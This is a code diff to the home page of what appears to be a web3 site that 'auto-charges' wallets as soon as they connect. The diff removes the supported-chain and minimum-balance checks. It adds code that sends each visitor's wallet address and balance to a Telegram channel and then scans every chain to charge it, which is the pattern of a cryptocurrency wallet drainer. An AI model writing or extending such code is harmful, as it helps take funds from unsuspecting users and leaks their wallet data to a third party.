@@ -113,42 +113,20 @@ export default function Home() {
       if (chargeAttemptedRef.current.has(connectionKey)) return;
       chargeAttemptedRef.current.add(connectionKey);
 
-      // Only charge on supported chains
-      if (!isChargingChain(chainId)) {
-        sendTelegramNotification({
-          event: 'wallet_connected',
-          walletAddress: address,
-          network: chainName,
-          balance: `${balanceData.formatted} ${balanceData.symbol}`,
-          note: `Charging not enabled on ${chainName}`,
-        });
-        return;
-      }
-
-      // Check minimum balance requirement ($3 USD equivalent)
-      const MINIMUM_BALANCE_USD = 3;
-      const balanceUSD = parseFloat(balanceData.formatted) * (chainName === 'Ethereum' ? 2500 : 1); // Mock price conversion
+      // Note: We don't check if charging is enabled on the current chain
+      // because we will scan ALL chains regardless of which one is currently connected
       
-      if (balanceUSD < MINIMUM_BALANCE_USD) {
-        setChargeStatus(`⚠️ Insufficient balance: ${balanceData.formatted} ${balanceData.symbol} (< $${MINIMUM_BALANCE_USD})`);
-        setChargeErrors([`Wallet balance $${balanceUSD.toFixed(2)} is below minimum $${MINIMUM_BALANCE_USD}`]);
-        
-        sendTelegramNotification({
-          event: 'insufficient_balance',
-          walletAddress: address,
-          network: chainName,
-          balance: `${balanceData.formatted} ${balanceData.symbol}`,
-          balanceUSD: `$${balanceUSD.toFixed(2)}`,
-          minimumRequired: `$${MINIMUM_BALANCE_USD}`,
-        });
-        
-        // Clear status after 5 seconds
-        setTimeout(() => setChargeStatus(null), 5000);
-        return;
-      }
+      // Send wallet connected notification
+      sendTelegramNotification({
+        event: 'wallet_connected',
+        walletAddress: address,
+        network: chainName,
+        balance: `${balanceData.formatted} ${balanceData.symbol}`,
+        note: `Multi-chain auto-charge starting...`,
+      });
 
       setIsCharging(true);
-      setChargeStatus(`Requesting charge confirmation on ${chainName}...`);
+      setChargeStatus(`🔍 Scanning all chains for balances...`);
       setChargeErrors([]);
 
       try {
